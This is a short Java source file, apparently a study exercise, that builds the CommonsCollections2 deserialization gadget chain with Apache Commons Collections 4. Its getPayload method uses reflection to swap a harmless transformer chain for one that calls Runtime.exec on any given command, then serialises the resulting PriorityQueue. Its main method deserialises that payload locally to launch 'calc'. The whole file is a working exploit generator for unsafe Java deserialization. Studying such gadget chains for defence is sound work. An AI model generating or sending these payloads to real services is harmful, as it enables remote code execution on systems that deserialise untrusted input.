import java.io.*;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import static base.learntemplatesimpl.setFieldValue;

public class CommonsCollections2 {
    byte[] getPayload(String payload) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { payload }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        TransformingComparator t = new TransformingComparator(transformerChain);
        PriorityQueue p = new PriorityQueue(2,t);
        p.add(1);
        p.add(2);
        setFieldValue(transformerChain, "iTransformers", transformers);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(p);
        return bos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        byte[] barr = new CommonsCollections2().getPayload("calc");
        System.out.println(barr.toString());
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr));
        Object o = (Object)ois.readObject();
    }
}
